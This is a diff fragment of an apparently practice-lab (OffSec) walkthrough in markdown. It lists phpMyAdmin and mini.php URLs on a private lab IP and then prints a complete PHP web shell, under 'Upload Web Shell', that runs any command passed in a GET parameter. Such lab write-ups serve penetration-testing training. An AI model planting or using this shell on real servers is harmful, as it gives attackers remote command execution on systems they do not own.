@@ -171,5 +171,36 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 ```
 
 ```
+http://192.168.187.132/phpmyadmin/
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/45f0f5c2-ab32-4494-bb6b-0e080a5c9926)
 
 ```
+
+```
+
+```
+http://192.168.187.132/mini.php
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2bf726fb-0cca-4591-a074-cd94dded4656)
+
+Upload Web Shell
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+
